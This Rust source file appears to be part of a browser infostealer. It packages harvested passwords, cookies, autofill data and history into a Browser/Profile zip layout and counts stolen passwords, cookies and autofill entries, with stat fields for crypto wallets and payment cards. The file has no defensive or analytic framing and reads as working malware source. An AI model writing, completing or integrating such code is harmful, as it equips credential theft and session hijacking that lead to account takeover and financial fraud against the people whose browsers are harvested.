//! Zip layout: Browser/Profile/{passwords,cookies,autofill,history}.txt (non-empty only)

fn has_text(content: &str) -> bool {
    !content.trim().is_empty()
}

fn has_cookie_data(content: &str) -> bool {
    content.lines().any(|line| {
        let t = line.trim();
        !t.is_empty() && !t.starts_with('#')
    })
}

pub fn push_profile_bundle(
    results: &mut Vec<(String, String)>,
    browser: &str,
    profile: &str,
    passwords: Option<String>,
    cookies: Option<String>,
    autofill: Option<String>,
    history: Option<String>,
) {
    let base = format!("{browser}/{profile}");

    if let Some(content) = passwords.filter(|c| has_text(c)) {
        results.push((format!("{base}/passwords.txt"), content));
    }
    if let Some(content) = cookies.filter(|c| has_cookie_data(c)) {
        results.push((format!("{base}/cookies.txt"), content));
    }
    if let Some(content) = autofill.filter(|c| has_text(c)) {
        results.push((format!("{base}/autofill.txt"), content));
    }
    if let Some(content) = history.filter(|c| has_text(c)) {
        results.push((format!("{base}/history.txt"), content));
    }
}

pub fn sort_entries(files: &mut [(String, String)]) {
    files.sort_by(|a, b| a.0.cmp(&b.0));
}

#[derive(Debug, Default, Clone, Copy)]
pub struct ExtractStats {
    pub autofills: usize,
    pub cookies: usize,
    pub passwords: usize,
    pub wallets: usize,
    pub cards: usize,
}

pub fn count_from_files(files: &[(String, String)]) -> ExtractStats {
    let mut stats = ExtractStats::default();

    for (path, content) in files {
        let lower = path.to_lowercase();
        if lower.ends_with("/passwords.txt") {
            stats.passwords += content.matches("URL:").count();
        } else if lower.ends_with("/cookies.txt") {
            stats.cookies += content
                .lines()
                .filter(|line| {
                    let t = line.trim();
                    !t.is_empty() && !t.starts_with('#')
                })
                .count();
        } else if lower.ends_with("/autofill.txt") {
            stats.autofills += content.matches("Name:").count() + content.matches("Field:").count();
        }
    }

    stats
}
